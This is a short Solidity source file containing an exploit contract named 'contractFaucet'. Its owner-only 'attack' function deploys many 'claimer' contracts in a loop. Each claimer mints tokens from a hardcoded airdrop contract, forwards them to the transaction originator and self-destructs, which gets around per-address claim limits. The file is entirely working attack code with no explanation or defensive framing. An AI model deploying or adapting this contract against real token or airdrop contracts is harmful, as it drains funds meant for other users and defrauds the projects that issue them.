// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

// idea from multicall contract

import "@openzeppelin/contracts/access/Ownable.sol";

interface airdrop {
    function mint(uint256 value) external returns (bool);
    
    function transfer(address recipient, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}
contract contractFaucet is Ownable {
    address constant contra = address(0x0Aa78575E17A*******2bA07669E2);
    function attack(uint256 times) public onlyOwner {
        for(uint i=0;i<times;++i){
            new claimer(contra);
        }
    }
}

contract claimer{
    constructor(address contra){
        airdrop(contra).mint(2000000);
        uint256 balance = airdrop(contra).balanceOf(address(this));
        airdrop(contra).transfer(address(tx.origin), balance);
        selfdestruct(payable(address(msg.sender)));
    }
}